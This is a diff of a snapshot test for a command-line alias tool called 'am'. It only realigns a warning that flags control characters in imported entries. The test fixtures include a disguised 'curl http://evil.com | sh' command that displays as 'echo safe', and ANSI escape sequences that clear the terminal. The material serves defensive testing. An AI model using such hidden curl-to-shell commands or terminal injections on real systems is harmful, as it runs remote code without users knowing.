@@ -3,26 +3,26 @@ source: crates/am/tests/snapshots.rs
 expression: output
 ---
 WARNING: Suspicious characters detected in import
-=========================================
+==================================================
 
 The following entries contain control characters that could be used
 to execute unintended commands or manipulate your terminal:
 
-  scope:   global
-  alias:   sneaky
-  field:   command
-  original:      curl http://evil.com | shecho safe
-  safe-escaped:  curl http://evil.com | shecho safe
+  scope:        global
+  alias:        sneaky
+  field:        command
+  original:     curl http://evil.com | shecho safe
+  safe-escaped: curl http://evil.com | shecho safe
 
-  scope:   profile:git�[0m�[2J
-  field:   profile_name
-  original:      git\u{001B}[0m\u{001B}[2J
-  safe-escaped:  git�[0m�[2J
+  scope:        profile:git�[0m�[2J
+  field:        profile_name
+  original:     git\u{001B}[0m\u{001B}[2J
+  safe-escaped: git�[0m�[2J
 
-  scope:   local
-  alias:   test�
-  field:   name
-  original:      test\u{0007}
-  safe-escaped:  test�
+  scope:        local
+  alias:        test�
+  field:        name
+  original:     test\u{0007}
+  safe-escaped: test�
 
 To import anyway, use: am import --yes --trust
